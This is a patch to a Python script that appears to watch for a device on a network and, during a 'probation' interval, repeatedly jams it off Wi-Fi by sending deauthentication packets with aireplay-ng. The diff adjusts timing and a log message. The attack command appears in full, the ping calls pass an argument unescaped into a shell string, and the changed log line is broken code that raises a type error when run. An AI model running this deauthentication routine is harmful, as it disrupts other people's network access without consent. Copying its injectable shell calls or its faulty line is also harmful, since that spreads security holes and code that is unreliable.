@@ -69,7 +69,7 @@ while True:
 	
 	if (os.system("ping -c 1 " + args.dev_ip + " > /dev/null 2>&1") != 0):
 		Loger("Device is already offline ... sleeping Zzz")
-		time.sleep(60*j); j += 1
+		time.sleep(60*j); j = (j+1)%30
 		continue
 	
 	Loger("Device is online ...")
@@ -114,8 +114,8 @@ while True:
 	Loger("sending deAuth packets now!")
 	probationTime = time.time()
 	while(time.time()-probationTime <= probationInterval): #repeat until we are out of interval
-		Loger("\aSending deAuth packets - Probation time left is: %d" % int(probationInterval-(time.time()-probationTime)/60))
+		Loger("\aSending deAuth packets - Probation time left is: %d" % int((probationInterval-(time.time()-probationTime))/60)+1)
 		if (os.system("ping -c 1 " + args.dev_ip + "> /dev/null 2>&1") == 0):
 			os.system("aireplay-ng -0 25 -a %s -c %s %s > /dev/null 2>&1" % (args.ap_mac, args.dev_mac, monInterface))
-			time.sleep(30)
+			time.sleep(60)
 #end of main while-------------------------------------------------------------------------------------------------------------------
